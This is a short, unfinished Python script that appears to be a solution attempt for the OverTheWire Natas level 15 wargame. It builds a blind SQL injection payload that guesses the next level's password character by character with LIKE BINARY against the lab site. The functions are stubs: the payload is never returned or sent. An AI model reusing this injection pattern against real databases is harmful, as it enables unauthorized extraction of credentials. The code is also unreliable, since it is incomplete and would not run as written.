import subprocess
import re
import requests
import string
from requests.auth import HTTPBasicAuth

passw = subprocess.run(['getpass', '15'], stdout=subprocess.PIPE).stdout.decode('utf-8')
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
def build_payload(curr_pass):
    payload = 'natas16" and password LIKE BINARY "' + curr_pass + '%"'

def inject_payload(payload):
    r = requests.post('https://natas15.natas.labs.overthewire.org/') 
    return true

if __name__ == "__main__":
    password = "" 
    


